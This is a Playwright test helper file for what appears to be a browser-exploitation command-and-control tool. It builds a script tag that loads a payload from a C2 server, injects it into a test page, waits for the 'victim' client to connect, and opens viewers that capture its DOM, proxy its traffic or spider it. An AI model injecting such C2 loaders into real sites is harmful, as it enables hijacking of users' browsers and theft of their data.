import { expect } from "@playwright/test";
import fs from "fs";
import path from "path";

const URLS_FILE = path.resolve("tests/e2e/.server-urls.json");

/**
 * Load the server URLs written by global-setup.js.
 * @returns {{ MGMT_URL: string, C2_URL: string }}
 */
export function loadServerUrls() {
  return JSON.parse(fs.readFileSync(URLS_FILE, "utf-8"));
}

/**
 * Create a payload link via the management API.
 * @param {string} mgmtUrl
 * @param {string} c2Url
 * @param {string[]} [payloads]
 * @param {string|null} [redirectUri] - URL the loader should iframe (defaults to
 *   location.origin which loads the SPA; pass e.g. `${mgmtUrl}/test` to iframe
 *   the test page so the payload captures its DOM instead of the dashboard)
 * @returns {Promise<{ linkId: string, scriptTag: string, link: object }>}
 */
export async function createLink(mgmtUrl, c2Url, payloads = ["domviewer"], redirectUri = null) {
  const res = await fetch(`${mgmtUrl}/api/links`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ payloads, redirectUri }),
  });
  const link = await res.json();
  const scriptTag = `<script src="${c2Url}/payload.js/${link.id}"></script>`;
  return { linkId: link.id, scriptTag, link };
}

/**
 * Inject the payload script tag into the test page via the #payload-input
 * textarea and #btn-inject button, then poll until the connected client for
 * the given linkId appears.  Filtering by linkId avoids race conditions when
 * multiple tests run in parallel and each creates its own link.
 *
 * @param {import("@playwright/test").Page} page - Page already at a /test* URL.
 * @param {string} mgmtUrl
 * @param {string} scriptTag
 * @param {string} linkId - The link ID returned by createLink; used to find
 *   exactly the client that connected for this test's payload link.
 * @returns {Promise<string>} The connected clientId.
 */
export async function injectAndWaitForClient(page, mgmtUrl, scriptTag, linkId) {
  await page.fill("#payload-input", scriptTag);
  await page.click("#btn-inject");

  let clientId;
  await expect(async () => {
    const res = await fetch(`${mgmtUrl}/api/clients`);
    const clients = await res.json();
    const connected = clients.find((c) => c.connected && c.linkId === linkId);
    expect(connected).toBeTruthy();
    clientId = connected.id;
  }).toPass({ timeout: 15_000 });

  return clientId;
}

/**
 * Navigate a page directly to the payload-specific viewer route.
 * Routes: /view/:id (domviewer), /proxy/:id (proxy), /spider/:id (spider)
 * @param {import("@playwright/test").Page} page
 * @param {string} mgmtUrl
 * @param {string} clientId
 * @param {string} tabName - Payload name: "proxy", "domviewer", or "spider"
 */
export async function openClientTab(page, mgmtUrl, clientId, tabName) {
  const routeMap = { domviewer: "view", proxy: "proxy", spider: "spider" };
  const segment = routeMap[tabName.toLowerCase()] ?? tabName.toLowerCase();
  await page.goto(`${mgmtUrl}/${segment}/${clientId}`);
}

/**
 * Wait for the proxy viewer iframe (inside the React SPA) to contain content.
 * Returns a FrameLocator pointing at the proxy iframe's contents.
 * @param {import("@playwright/test").Page} page
 * @returns {import("@playwright/test").FrameLocator}
 */
export async function waitForViewerContent(page) {
  // The proxy viewer uses sandbox="allow-same-origin"
  const frame = page.frameLocator('iframe[sandbox="allow-same-origin"]');
  await expect(frame.locator("body")).not.toBeEmpty({ timeout: 15_000 });
  return frame;
}
